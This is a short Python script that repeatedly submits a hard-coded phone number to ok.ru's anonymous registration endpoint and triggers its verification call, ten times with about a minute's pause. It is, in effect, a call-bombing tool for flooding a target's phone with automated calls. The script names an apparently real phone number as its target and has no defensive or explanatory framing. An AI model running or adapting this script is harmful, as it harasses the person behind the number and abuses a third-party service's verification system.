list=[+212663012596]
for i in list:
  for j in range(10):
    ##call
    import requests
    import time
    s = requests.session()
    payload = {'st.r.phone': i}
    response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = payload)
    print (response.status_code)
    time.sleep(1)
    payload2 = {'st.r.fieldAcceptCallUIButton': 'Call'}
    response =s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data = payload2)
    print (response.status_code, response.reason, j)
    time.sleep(63)